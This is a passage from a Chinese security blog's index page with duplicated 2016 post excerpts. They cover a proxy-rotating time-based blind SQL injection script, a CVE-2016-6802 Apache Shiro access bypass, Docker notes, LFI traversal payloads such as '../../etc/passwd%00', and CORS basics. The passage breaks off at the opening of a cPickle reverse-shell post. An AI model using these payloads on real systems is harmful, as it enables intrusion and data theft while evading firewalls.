			<span class="token keyword">if</span> req<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
				<span class="token keyword">print</span> <span class="token string">"[*]i:%s, before:%s, now:%s, Cost:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> now<span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>now<span class="token punctuation">)</span>
				<span class="token keyword">print</span> <span class="token string">"[*]proxy:%s, Content:%s, Testtime:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span> testtime<span class="token punctuation">)</span>
				<span class="token keyword">print</span> <span class="token string">"[*]TimeCompare: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>now<span class="token punctuation">)</span> <span class="token operator">-</span> testtime<span class="token punctuation">)</span>
				<span class="token keyword">print</span> <span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">30</span>
				<span class="token keyword">break</span>
		<span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
			<span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>开个proxypool.py，然后<code>http://127.0.0.1:1111/time&lt;4</code>找个稍微好点的代理，就这样循环下去吧，这样每次请求目标之后，都会切换到下个代理。所以就不会触发防火墙啦，具体效果再说。</p>
<p>实测还没测出来，感觉有点悬。</p>

	

	</div>
  <a type="button" href="/2016/11/08/sql-proxy.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># coding: utf-8</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

target <span class="token operator">=</span> <span class="token string">'http://www.vulnerable.com'</span>
headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
	<span class="token string">"Host"</span><span class="token punctuation">:</span> <span class="token string">"www.vulnerable.com"</span><span class="token punctuation">,</span>
	<span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"</span> <span class="token punctuation">,</span>
	<span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'close'</span><span class="token punctuation">,</span>
	<span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3"</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> <span class="token string">"f4udpabdluoed7ldhfp90"</span><span class="token punctuation">&#125;</span>
	payload <span class="token operator">=</span> <span class="token string">"1' or select if(length(user())=&#123;&#125;,sleep(15),1) or '1'='1"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
	data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"userpwd"</span><span class="token punctuation">:</span> <span class="token string">"abc"</span><span class="token punctuation">&#125;</span>

	<span class="token keyword">def</span> <span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
			r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://127.0.0.1:1111/time&lt;4"</span><span class="token punctuation">)</span>
			proxy <span class="token operator">=</span> r<span class="token punctuation">.</span>content<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"[\"]"</span><span class="token punctuation">)</span>
			ab <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
			<span class="token keyword">try</span><span class="token punctuation">:</span>
				test <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://www.vulnerable.com"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span> proxy<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
				<span class="token keyword">if</span> test<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
					<span class="token keyword">return</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> ab<span class="token punctuation">)</span><span class="token punctuation">,</span> proxy
			<span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
				<span class="token keyword">pass</span>

	<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
		testtime<span class="token punctuation">,</span> proxy <span class="token operator">=</span> val<span class="token punctuation">(</span><span class="token punctuation">)</span>
		now <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token keyword">try</span><span class="token punctuation">:</span>
			req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span> proxy<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">)</span>
			<span class="token keyword">if</span> req<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
				<span class="token keyword">print</span> <span class="token string">"[*]i:%s, before:%s, now:%s, Cost:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> now<span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>now<span class="token punctuation">)</span>
				<span class="token keyword">print</span> <span class="token string">"[*]proxy:%s, Content:%s, Testtime:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span> testtime<span class="token punctuation">)</span>
				<span class="token keyword">print</span> <span class="token string">"[*]TimeCompare: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>now<span class="token punctuation">)</span> <span class="token operator">-</span> testtime<span class="token punctuation">)</span>
				<span class="token keyword">print</span> <span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">30</span>
				<span class="token keyword">break</span>
		<span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
			<span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>开个proxypool.py，然后<code>http://127.0.0.1:1111/time&lt;4</code>找个稍微好点的代理，就这样循环下去吧，这样每次请求目标之后，都会切换到下个代理。所以就不会触发防火墙啦，具体效果再说。</p>
<p>实测还没测出来，感觉有点悬。</p>

	
	</div>
  <a type="button" href="/2016/11/08/sql-proxy.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/10/25/cve-2016-6802.html" >CVE-2016-6802</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-10-25  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>Apache Shiro before 1.3.2 allows attackers to bypass intended servlet filters and gain access by leveraging use of a non-root servlet context path. </p>
</blockquote>
<p>描述比较简单，官方修改的时候对于最新版本做了简单的修改：</p>
<pre class="line-numbers language-none"><code class="language-none">
WebUtils.java
+ contextPath &#x3D; normalize(decodedRequestString(request, contextPath));
if (&quot;&#x2F;&quot;.equeal(contextPath)) &#123;
    contextPath &#x3D; &quot;&quot;;
 &#125;
 return contextPath;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>主要添加了上面一行，在请求处理之前先decoded，然后恢复正常。所以最后的exp很简单：</p>
<p>比如作为一个普通账户的时候，知道admin路径，在访问的时候访问admin路径，然后burp截断，在请求路径后面添加<code>%2f</code>，即可绕过shiro路径控制。</p>

	

	</div>
  <a type="button" href="/2016/10/25/cve-2016-6802.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>Apache Shiro before 1.3.2 allows attackers to bypass intended servlet filters and gain access by leveraging use of a non-root servlet context path. </p>
</blockquote>
<p>描述比较简单，官方修改的时候对于最新版本做了简单的修改：</p>
<pre class="line-numbers language-none"><code class="language-none">
WebUtils.java
+ contextPath &#x3D; normalize(decodedRequestString(request, contextPath));
if (&quot;&#x2F;&quot;.equeal(contextPath)) &#123;
    contextPath &#x3D; &quot;&quot;;
 &#125;
 return contextPath;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>主要添加了上面一行，在请求处理之前先decoded，然后恢复正常。所以最后的exp很简单：</p>
<p>比如作为一个普通账户的时候，知道admin路径，在访问的时候访问admin路径，然后burp截断，在请求路径后面添加<code>%2f</code>，即可绕过shiro路径控制。</p>

	
	</div>
  <a type="button" href="/2016/10/25/cve-2016-6802.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/10/08/docker.html" >Docker笔记</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-10-08  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<ul>
<li>Docker container(容器): 应用在内部跑，有自己完整的文件系统和操作系统。</li>
<li>Docker image(镜像): 应用代码各种库和文件打包一个文件，这个就是image，需要加载到容器才能运行。</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> info  <span class="token comment">#列出container和image的数量，宿主操作系统等</span>

<span class="token function">docker</span> run -t -i ubuntu /bin/bash
<span class="token comment">#run 运行一个容器，-t 创造一个伪TTY, -i表示吧STDIN打开，这两个参数是让终端可用，ubuntu是指镜像名，/bin/bash是要运行的命令。exit或者Ctrl+d 退出</span>

<span class="token function">docker</span> <span class="token function">ps</span> -a <span class="token comment">#查看有哪些容器在运行</span>

<span class="token function">docker</span> start e0521aa52895 <span class="token comment">#启动那个容器</span>
<span class="token function">docker</span> attach e0521aa52895 <span class="token comment">#再次登录上去，不能用run，否则会新建一个容器</span>

上面两个命令用一个命令代替：
<span class="token function">docker</span> start -a -i e0521aa52895
<span class="token comment"># -a 表示attach， -i 表示开启stdin</span>

如果想多连shell，attach命令会卡，可以用exec让这个容器再运行一个bash
<span class="token function">docker</span> <span class="token builtin class-name">exec</span> -i -t e0521aa52895 /bin/bash

<span class="token function">docker</span> <span class="token function">rm</span> e0521aa52895 <span class="token comment">#删除容器</span>
<span class="token function">docker</span> <span class="token function">rm</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> <span class="token function">ps</span> -q -f <span class="token assign-left variable">status</span><span class="token operator">=</span>exited<span class="token variable">)</span></span>d
<span class="token comment">#删除所有退出状态的容器</span>

<span class="token function">docker</span> run -it -p <span class="token number">8888</span>:80 imagine10255/centos6-lnmp-php56
<span class="token comment">#lnmp的80端口映射到8888端口，并且开启一个交互的shell</span>

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我想要docker在后台运行，每次都可以进去修改一些东西，但是查了资料不太如意，docker后台运行的时候，他里面必须要有一个程序一直在运行。为了偷懒我用了screen，然后<code>docker run -it -p 8888:80 --name web  imagine10255/centos6-lnmp-php56</code>，这样退出之后使用<code>docker exec -t -i 35f89fd74804 /bin/bash</code>。突然感觉好方便=。=</p>
<pre class="line-numbers language-none"><code class="language-none">给docker起一个名字之后可以这样执行命令
docker exec web ls
docker start web
docker port web<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>docker修改了部分文件之后可以先退出，使得docker的container是exited状态，然后docker commit 3d1d1748aaeb web 这样保存，下次直接运行web这个images即可。</p>
<pre class="line-numbers language-none"><code class="language-none">docker save IMAGENAMW |bazip2 -9 -c &gt; img.tar.bz2
bzip2 -d -c &lt; img.tar.bz2 |docker load


docker export &lt;container id&gt; |bzip2 -9 -c &gt; img.tar.bz2
bzip2 -d -c &lt; img.tar.bz2 | docker import - name&#x2F;versio:tag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在做一个lnmp的docker，使用ubuntu12.04,lnmp1.3版本，dockerfile如下</p>
<pre class="line-numbers language-none"><code class="language-none">FROM ubuntu:12.04

ENV ROOT_PATH &#x2F;root
RUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install axel -y &amp;&amp; apt-get install net-tools -y
WORKDIR $ROOT_PATH
RUN axel ftp:&#x2F;&#x2F;soft.vpser.net&#x2F;lnmp&#x2F;lnmp1.3-full.tar.gz &amp;&amp; tar zxvf lnmp1.3-full.tar.gz &amp;&amp; cd lnmp1.3-full
WORKDIR &#x2F;root&#x2F;lnmp1.3-full
RUN echo -e 8e17f72 | bash install.sh


EXPOSE 80 3306 9000
CMD [&quot;bash&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code> docker build -t user/lnmp:tag  .</code>，在vps上面等等就ok，最后可以看到新生成的images，<code>docker start -it IMAGEID bash</code>删除一些东西，mysql进不去可以这样修改</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;init.d&#x2F;mysql stop
mysqld_safe --user&#x3D;mysql --skip-grant-tables --skip-networking &amp;
mysql -uroot -p

update user set Password&#x3D;PASSWORD(&#39;newpassword&#39;) where USER&#x3D;&#39;root&#39;
FLUSH PRIVILEGES;
quit
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2016/10/08/docker.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<ul>
<li>Docker container(容器): 应用在内部跑，有自己完整的文件系统和操作系统。</li>
<li>Docker image(镜像): 应用代码各种库和文件打包一个文件，这个就是image，需要加载到容器才能运行。</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> info  <span class="token comment">#列出container和image的数量，宿主操作系统等</span>

<span class="token function">docker</span> run -t -i ubuntu /bin/bash
<span class="token comment">#run 运行一个容器，-t 创造一个伪TTY, -i表示吧STDIN打开，这两个参数是让终端可用，ubuntu是指镜像名，/bin/bash是要运行的命令。exit或者Ctrl+d 退出</span>

<span class="token function">docker</span> <span class="token function">ps</span> -a <span class="token comment">#查看有哪些容器在运行</span>

<span class="token function">docker</span> start e0521aa52895 <span class="token comment">#启动那个容器</span>
<span class="token function">docker</span> attach e0521aa52895 <span class="token comment">#再次登录上去，不能用run，否则会新建一个容器</span>

上面两个命令用一个命令代替：
<span class="token function">docker</span> start -a -i e0521aa52895
<span class="token comment"># -a 表示attach， -i 表示开启stdin</span>

如果想多连shell，attach命令会卡，可以用exec让这个容器再运行一个bash
<span class="token function">docker</span> <span class="token builtin class-name">exec</span> -i -t e0521aa52895 /bin/bash

<span class="token function">docker</span> <span class="token function">rm</span> e0521aa52895 <span class="token comment">#删除容器</span>
<span class="token function">docker</span> <span class="token function">rm</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> <span class="token function">ps</span> -q -f <span class="token assign-left variable">status</span><span class="token operator">=</span>exited<span class="token variable">)</span></span>d
<span class="token comment">#删除所有退出状态的容器</span>

<span class="token function">docker</span> run -it -p <span class="token number">8888</span>:80 imagine10255/centos6-lnmp-php56
<span class="token comment">#lnmp的80端口映射到8888端口，并且开启一个交互的shell</span>

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我想要docker在后台运行，每次都可以进去修改一些东西，但是查了资料不太如意，docker后台运行的时候，他里面必须要有一个程序一直在运行。为了偷懒我用了screen，然后<code>docker run -it -p 8888:80 --name web  imagine10255/centos6-lnmp-php56</code>，这样退出之后使用<code>docker exec -t -i 35f89fd74804 /bin/bash</code>。突然感觉好方便=。=</p>
<pre class="line-numbers language-none"><code class="language-none">给docker起一个名字之后可以这样执行命令
docker exec web ls
docker start web
docker port web<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>docker修改了部分文件之后可以先退出，使得docker的container是exited状态，然后docker commit 3d1d1748aaeb web 这样保存，下次直接运行web这个images即可。</p>
<pre class="line-numbers language-none"><code class="language-none">docker save IMAGENAMW |bazip2 -9 -c &gt; img.tar.bz2
bzip2 -d -c &lt; img.tar.bz2 |docker load


docker export &lt;container id&gt; |bzip2 -9 -c &gt; img.tar.bz2
bzip2 -d -c &lt; img.tar.bz2 | docker import - name&#x2F;versio:tag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在做一个lnmp的docker，使用ubuntu12.04,lnmp1.3版本，dockerfile如下</p>
<pre class="line-numbers language-none"><code class="language-none">FROM ubuntu:12.04

ENV ROOT_PATH &#x2F;root
RUN apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get install axel -y &amp;&amp; apt-get install net-tools -y
WORKDIR $ROOT_PATH
RUN axel ftp:&#x2F;&#x2F;soft.vpser.net&#x2F;lnmp&#x2F;lnmp1.3-full.tar.gz &amp;&amp; tar zxvf lnmp1.3-full.tar.gz &amp;&amp; cd lnmp1.3-full
WORKDIR &#x2F;root&#x2F;lnmp1.3-full
RUN echo -e 8e17f72 | bash install.sh


EXPOSE 80 3306 9000
CMD [&quot;bash&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code> docker build -t user/lnmp:tag  .</code>，在vps上面等等就ok，最后可以看到新生成的images，<code>docker start -it IMAGEID bash</code>删除一些东西，mysql进不去可以这样修改</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;init.d&#x2F;mysql stop
mysqld_safe --user&#x3D;mysql --skip-grant-tables --skip-networking &amp;
mysql -uroot -p

update user set Password&#x3D;PASSWORD(&#39;newpassword&#39;) where USER&#x3D;&#39;root&#39;
FLUSH PRIVILEGES;
quit
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2016/10/08/docker.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/09/25/whitehat-talk-web-security.html" >《白帽子讲Web安全》</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-09-25  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h3 id="文件包含漏洞（File-Inclusion）"><a href="#文件包含漏洞（File-Inclusion）" class="headerlink" title="文件包含漏洞（File Inclusion）"></a>文件包含漏洞（File Inclusion）</h3><p>文件包含可能会出现在JSP、PHP、ASP等语言中，常见的函数如下：<br><code>PHP: include()、include_once()、require()、require_once()、fopen()、readfile()</code></p>
<p>文件包含是PHP的一种常见用法，主要由四个函数组成：</p>
<ul>
<li>include()</li>
<li>require()</li>
<li>include_onec()</li>
<li>require_once()</li>
</ul>
<p>当使用这4个函数包含一个新的文件，该文件将作为PHP代码执行，PHP内核并不会在意被包含的文件是什么类型。</p>
<p>所以如果被包含的是txt文件，图片文件，远程URL等都会作为PHP代码执行。</p>
<p>能够打开并且包含本地文件的漏洞称为本地文件包含漏洞（Local File Inclusion，LFI）</p>
<p>PHP语言是由C语言实现的，因此使用了C语言中一些字符串处理函数，在连接字符串的时候，0字节（\x00）讲作为字符串结束符。所以攻击者可以加一个0字节，截断file变量后面的字符串，即<br><code>../../etc/passwd\0</code>，在get请求的时候进行Urlencode，变成<code>../../etc/passwd%00</code>。</p>
<p>如果禁用了0字节可以利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。目录字符串，在windows下256字节，Linux下4096字节会达到最大值，最大值长度之后的字符串将会被丢弃。可以通过如下构造:<br><code>../../../../../../../../../../../../../../abc</code></p>
<ul>
<li>%2e%2e%2f 等同于 ../</li>
<li>%2e%2e/ 同上</li>
<li>..%2f 同上</li>
<li>%2e%2e%5c ..\</li>
<li>%252%252%255c等同于..\</li>
</ul>
	

	</div>
  <a type="button" href="/2016/09/25/whitehat-talk-web-security.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h3 id="文件包含漏洞（File-Inclusion）"><a href="#文件包含漏洞（File-Inclusion）" class="headerlink" title="文件包含漏洞（File Inclusion）"></a>文件包含漏洞（File Inclusion）</h3><p>文件包含可能会出现在JSP、PHP、ASP等语言中，常见的函数如下：<br><code>PHP: include()、include_once()、require()、require_once()、fopen()、readfile()</code></p>
<p>文件包含是PHP的一种常见用法，主要由四个函数组成：</p>
<ul>
<li>include()</li>
<li>require()</li>
<li>include_onec()</li>
<li>require_once()</li>
</ul>
<p>当使用这4个函数包含一个新的文件，该文件将作为PHP代码执行，PHP内核并不会在意被包含的文件是什么类型。</p>
<p>所以如果被包含的是txt文件，图片文件，远程URL等都会作为PHP代码执行。</p>
<p>能够打开并且包含本地文件的漏洞称为本地文件包含漏洞（Local File Inclusion，LFI）</p>
<p>PHP语言是由C语言实现的，因此使用了C语言中一些字符串处理函数，在连接字符串的时候，0字节（\x00）讲作为字符串结束符。所以攻击者可以加一个0字节，截断file变量后面的字符串，即<br><code>../../etc/passwd\0</code>，在get请求的时候进行Urlencode，变成<code>../../etc/passwd%00</code>。</p>
<p>如果禁用了0字节可以利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。目录字符串，在windows下256字节，Linux下4096字节会达到最大值，最大值长度之后的字符串将会被丢弃。可以通过如下构造:<br><code>../../../../../../../../../../../../../../abc</code></p>
<ul>
<li>%2e%2e%2f 等同于 ../</li>
<li>%2e%2e/ 同上</li>
<li>..%2f 同上</li>
<li>%2e%2e%5c ..\</li>
<li>%252%252%255c等同于..\</li>
</ul>
	
	</div>
  <a type="button" href="/2016/09/25/whitehat-talk-web-security.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/08/29/csrf.html" >CSRF</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-08-29  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源策略(Same Origin policy, SOP)，也称为单源策略(Single Origin policy)，用于Web浏览器编程语言的安全措施，用以保护信息的保密性和安全性。同源策略防止网站脚本访问其他站点使用脚本，也组织它与其他站点交互。<br>只要<strong>协议</strong>、<strong>端口</strong>、<strong>主机</strong>三个有一个不匹配，就是跨域请求。</p>
<p>如果要跨域请求，有下面的限制：</p>
<ul>
<li>仅允许GET、HEAD、POST请求</li>
<li>仅允许手动设置Accept、Accept-Language、Content-Language和Content-Type头</li>
<li>Content-Type头仅允许使用application/x-www-form-urlencoded,multipart/form-data和text/plain这三种值。</li>
</ul>
<p>满足以上三个请求的，称为simple request<br>当上门的simple request不能满足使用场景的时候，有以下的请求解决跨域限制，都是以<code>Access-Control-</code>开头，比较重要的有：</p>
<ul>
<li>Access-Control-Allow-Origin：限制这个请求能从哪些URI访问。</li>
</ul>
<blockquote>
<p>在使用这个请求，使用AJAX时，被调用方需要输出这个头，指名可以从哪个网站 访问，如果未输出这个头，只允许同域名的访问。</p>
</blockquote>
<ul>
<li>Access-Control-Allow-Credentials: 允许这个请求使用cookie。</li>
</ul>
<blockquote>
<p>一般跨域情况下，AJAX不会附带用户的Cookie，也不允许设置用户的Cookie，要使用这个的话，首先C在构造这个XMLHTTPRequest对象时，需要设置withCredentials属性。</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">XMLHttpRequest:

var xhr &#x3D; new XMLHttpRequest();
xhr.open(&#39;GET&#39;, url, true);
xhr.withCredentials &#x3D; true;
xhr.onreadystatechange &#x3D; handler;
xhr.send()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2016/08/29/csrf.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源策略(Same Origin policy, SOP)，也称为单源策略(Single Origin policy)，用于Web浏览器编程语言的安全措施，用以保护信息的保密性和安全性。同源策略防止网站脚本访问其他站点使用脚本，也组织它与其他站点交互。<br>只要<strong>协议</strong>、<strong>端口</strong>、<strong>主机</strong>三个有一个不匹配，就是跨域请求。</p>
<p>如果要跨域请求，有下面的限制：</p>
<ul>
<li>仅允许GET、HEAD、POST请求</li>
<li>仅允许手动设置Accept、Accept-Language、Content-Language和Content-Type头</li>
<li>Content-Type头仅允许使用application/x-www-form-urlencoded,multipart/form-data和text/plain这三种值。</li>
</ul>
<p>满足以上三个请求的，称为simple request<br>当上门的simple request不能满足使用场景的时候，有以下的请求解决跨域限制，都是以<code>Access-Control-</code>开头，比较重要的有：</p>
<ul>
<li>Access-Control-Allow-Origin：限制这个请求能从哪些URI访问。</li>
</ul>
<blockquote>
<p>在使用这个请求，使用AJAX时，被调用方需要输出这个头，指名可以从哪个网站 访问，如果未输出这个头，只允许同域名的访问。</p>
</blockquote>
<ul>
<li>Access-Control-Allow-Credentials: 允许这个请求使用cookie。</li>
</ul>
<blockquote>
<p>一般跨域情况下，AJAX不会附带用户的Cookie，也不允许设置用户的Cookie，要使用这个的话，首先C在构造这个XMLHTTPRequest对象时，需要设置withCredentials属性。</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">XMLHttpRequest:

var xhr &#x3D; new XMLHttpRequest();
xhr.open(&#39;GET&#39;, url, true);
xhr.withCredentials &#x3D; true;
xhr.onreadystatechange &#x3D; handler;
xhr.send()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2016/08/29/csrf.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/07/26/python-cpickle-shell.html" >Python cPickle 反序列化shell</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-07-26  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>利用Python cPickle反序列化反弹shell，主要利用cPicle的<code>__reduce__</code>，在反序列化的时候自动执行，官方文档有如下：</p>
<blockquote>
